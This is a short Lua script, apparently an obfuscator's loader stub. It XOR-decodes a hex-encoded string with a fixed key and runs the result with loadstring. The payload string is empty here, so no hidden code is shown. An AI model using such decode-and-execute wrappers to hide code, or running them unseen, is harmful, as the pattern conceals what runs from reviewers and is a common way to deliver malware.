local k={210,145,48,82,160,233,111,84,199,147,39,215,32,185,14,22,14,242,37,78,58,252,13,248,128,218,66,174,50,226,228,146}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
fn()
